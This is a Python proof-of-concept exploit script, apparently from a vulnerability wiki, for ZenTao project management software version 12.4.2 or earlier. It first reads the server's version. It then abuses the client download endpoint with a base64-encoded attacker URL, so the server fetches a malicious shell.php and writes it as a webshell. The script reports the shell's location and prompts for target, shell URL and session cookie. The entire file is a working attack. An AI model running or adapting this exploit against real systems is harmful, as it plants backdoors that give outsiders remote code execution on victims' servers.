#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')
    print('+  \033[34mVersion: zentao version <= 12.4.2                                 \033[0m')
    print('+  \033[36m使用格式: python3 CNVD-C-2020-121325.py                             \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mShell       >>> http://xxx.xxx.xxx.xxx/shell.php(恶意文件地址)       \033[0m')
    print('+  \033[36mZentaosid   >>> xxxxxxxxxxxxxx(cookie字段)                          \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    version_url = target_url + "/www/index.php?mode=getconfig"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        response = requests.get(url=version_url, timeout=20, headers=headers)
        version = json.loads(response.text)['version']
        print("\033[32m[o] 禅道版本为:{}\033[0m".format(version))

    except Exception as e:
        print("\033[31m[x] 获取版本失败 \033[0m", e)

def POC_2(target_url, shell_url, zentaosid):
    options = shell_url.split("://")
    if options[0] == "http":
        shell_url = "HTTP://" + options[1]
    elif options[0] == "ftp":
        shell_url = "ftp://" + options[1]
    else:
        print("\033[31m[x] 请使用正确的请求地址 \033[0m")
        sys.exit(0)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":"zentaosid={}".format(zentaosid)
    }

    shell_url_base = str((base64.b64encode(shell_url.encode('utf-8'))),'utf-8')
    vuln_url = target_url + "/www/index.php?m=client&f=download&version=test&link={}".format(shell_url_base)
    print("\033[32m[o] 请求漏洞url：{}\033[0m".format(vuln_url))

    try:
        response = requests.get(url=vuln_url, timeout=20, headers=headers)
        if "保存成功" in response.text:
            print("\033[32m[o] 成功写入Webshell，URL地址为：{}/www/data/client/test/Webshell_name.php\033[0m".format(target_url))
        else:
            print("\033[31m[x] 恶意文件下载失败 \033[0m")
    except:
        print("\033[31m[x] 恶意文件下载失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    shell_url  = str(input("\033[35mShell >>> \033[0m"))
    zentaosid  = str(input("\033[35mZentaosid >>> \033[0m"))
    POC_1(target_url)
    POC_2(target_url, shell_url, zentaosid)